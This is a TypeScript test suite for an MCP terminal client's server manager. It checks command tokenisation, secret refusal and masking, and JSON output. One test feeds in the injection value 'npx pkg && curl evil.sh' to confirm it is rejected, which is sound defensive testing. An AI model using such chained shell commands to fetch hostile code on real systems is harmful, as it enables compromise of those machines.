import assert from 'node:assert/strict';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, it } from 'node:test';
import { ConfigStore } from '../src/config.js';
import { McpTerminalError, toTerminalError } from '../src/errors.js';
import { Output } from '../src/format.js';
import type { Sink } from '../src/format.js';
import { clearSecrets } from '../src/logger.js';
import { McpClientManager } from '../src/mcpClient.js';
import { ServerManager } from '../src/serverManager.js';
import type { AddServerSpec } from '../src/serverManager.js';

function memorySink(): { sink: Sink; stdout: string[]; stderr: string[] } {
  const stdout: string[] = [];
  const stderr: string[] = [];
  return { sink: { out: (t) => void stdout.push(t), err: (t) => void stderr.push(t) }, stdout, stderr };
}

const base: Pick<AddServerSpec, 'env' | 'headers' | 'overwrite'> = { env: {}, headers: {}, overwrite: false };

describe('ServerManager', () => {
  let dir: string;
  let manager: ServerManager;

  beforeEach(async () => {
    clearSecrets();
    dir = await mkdtemp(join(tmpdir(), 'mcp-terminal-sm-'));
    manager = new ServerManager(new ConfigStore(join(dir, 'servers.json')), new McpClientManager());
  });
  afterEach(async () => {
    await manager.clients.disconnectAll();
    await rm(dir, { recursive: true, force: true });
  });

  it('ajoute un serveur stdio avec tokenisation et sans shell', async () => {
    const { server } = await manager.add({
      ...base,
      name: 'filesystem',
      kind: 'stdio',
      target: 'npx -y @modelcontextprotocol/server-filesystem /storage/emulated/0/Download',
    });
    assert.equal(server.transport, 'stdio');
    assert.equal(server.target, 'npx -y @modelcontextprotocol/server-filesystem /storage/emulated/0/Download');
    const file = await manager.store.load();
    const saved = file.servers['filesystem'];
    assert.ok(saved && saved.transport === 'stdio');
    if (saved && saved.transport === 'stdio') {
      assert.equal(saved.command, 'npx');
      assert.deepEqual(saved.args, ['-y', '@modelcontextprotocol/server-filesystem', '/storage/emulated/0/Download']);
    }
  });

  it('refuse les commandes avec opérateurs shell', async () => {
    await assert.rejects(
      manager.add({ ...base, name: 'bad', kind: 'stdio', target: 'npx pkg && curl evil.sh' }),
      { code: 'INVALID_ARGUMENT' },
    );
  });

  it('ajoute un serveur HTTP et avertit pour http distant', async () => {
    const { warnings } = await manager.add({ ...base, name: 'remote', kind: 'http', target: 'http://example.com/mcp' });
    assert.equal(warnings.length, 1);
    await assert.rejects(manager.add({ ...base, name: 'remote', kind: 'http', target: 'https://example.com/mcp' }), {
      code: 'SERVER_EXISTS',
    });
  });

  it('refuse les secrets en clair (env, en-têtes, arguments) et ne les écrit jamais', async () => {
    await assert.rejects(
      manager.add({ ...base, name: 'a', kind: 'http', target: 'https://example.com/mcp', headers: { Authorization: 'Bearer en-clair' } }),
      { code: 'SECRET_LITERAL' },
    );
    await assert.rejects(
      manager.add({ ...base, name: 'b', kind: 'stdio', target: 'node srv.js', env: { GITHUB_TOKEN: 'ghp_en_clair' } }),
      { code: 'SECRET_LITERAL' },
    );
    await assert.rejects(
      manager.add({ ...base, name: 'c', kind: 'stdio', target: 'node srv.js --api-key sk_en_clair_123456' }),
      { code: 'SECRET_LITERAL' },
    );
    assert.deepEqual(await manager.store.names(), []);
  });

  it('/servers list ne révèle aucune valeur secrète, seulement les références', async () => {
    await manager.add({
      ...base,
      name: 'gh',
      kind: 'http',
      target: 'https://example.com/mcp',
      headers: { Authorization: 'Bearer ${GITHUB_TOKEN}' },
    });
    const views = await manager.list();
    assert.equal(views.length, 1);
    assert.equal(views[0]?.headers['Authorization'], 'Bearer ${GITHUB_TOKEN}');
    assert.equal(views[0]?.connected, false);
  });

  it('supprime un serveur et signale les serveurs inconnus', async () => {
    await manager.add({ ...base, name: 'tmp', kind: 'stdio', target: 'node x.js' });
    await manager.remove('tmp');
    assert.deepEqual(await manager.list(), []);
    await assert.rejects(manager.remove('tmp'), { code: 'SERVER_NOT_FOUND' });
    await assert.rejects(manager.connect('absent'), { code: 'SERVER_NOT_FOUND' });
  });

  it('ensureConnected explique quoi faire quand rien n\'est sélectionné', async () => {
    await manager.add({ ...base, name: 'one', kind: 'stdio', target: 'node x.js' });
    await manager.add({ ...base, name: 'two', kind: 'stdio', target: 'node y.js' });
    await assert.rejects(manager.ensureConnected(), { code: 'NOT_CONNECTED' });
  });
});

describe('sortie JSON', () => {
  it('produit du JSON valide pour les données', () => {
    const { sink, stdout } = memorySink();
    new Output({ json: true, quiet: false, color: false }, sink).data({ servers: [] }, () => 'texte');
    assert.deepEqual(JSON.parse(stdout.join('\n')), { servers: [] });
  });

  it('produit du JSON valide pour les erreurs', () => {
    const { sink, stdout } = memorySink();
    new Output({ json: true, quiet: false, color: false }, sink).error(
      new McpTerminalError('SERVER_NOT_FOUND', 'Serveur inconnu : "x".', 'Utilisez /servers add.'),
    );
    const parsed = JSON.parse(stdout.join('\n')) as Record<string, unknown>;
    assert.equal(parsed['error'], true);
    assert.equal(parsed['code'], 'SERVER_NOT_FOUND');
    assert.equal(typeof parsed['message'], 'string');
  });

  it('masque les secrets dans les messages d\'erreur et les sorties', async () => {
    const { registerSecret } = await import('../src/logger.js');
    registerSecret('topsecret-value-42');
    const error = toTerminalError(new Error('échec de connexion avec topsecret-value-42'));
    assert.ok(!error.message.includes('topsecret-value-42'));
    const { sink, stdout } = memorySink();
    new Output({ json: false, quiet: false, color: false }, sink).data({}, () => 'valeur topsecret-value-42');
    assert.ok(!stdout.join('').includes('topsecret-value-42'));
    clearSecrets();
  });

  it('--quiet masque les infos mais pas les résultats', () => {
    const { sink, stdout } = memorySink();
    const out = new Output({ json: false, quiet: true, color: false }, sink);
    out.info('bavardage');
    out.data({}, () => 'résultat');
    assert.deepEqual(stdout, ['résultat']);
  });
});
